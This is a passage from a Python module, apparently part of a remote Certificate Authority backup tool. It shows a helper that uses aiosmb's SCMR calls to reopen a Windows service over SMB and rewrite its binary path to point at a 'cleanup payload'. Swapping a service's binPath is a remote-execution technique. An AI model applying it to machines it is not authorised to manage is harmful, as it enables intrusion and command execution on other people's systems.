    The high-level RemoteServiceManager only exposes ``enable_service`` (which
    flips dwStartType).  We call the underlying ``scmr.hRChangeServiceConfigW``
    directly to swap binPath for the cleanup payload.
    """
    from aiosmb.dcerpc.v5 import scmr

    if not getattr(scm, "service_handles", None):
        return
    handle = scm.service_handles.get(service_name)
    if handle is None:
        # Re-open the service so we have a handle.
        _, err = await scm.open_service(service_name)
        if err is not None:
            return
        handle = scm.service_handles.get(service_name)
    if handle is None:
        return
    await scmr.hRChangeServiceConfigW(
        scm.dce, handle, lpBinaryPathName=(new_bin_path + "\x00")
    )


__all__ = ["CABackupConfig", "CABackupResult", "ca_backup_native"]
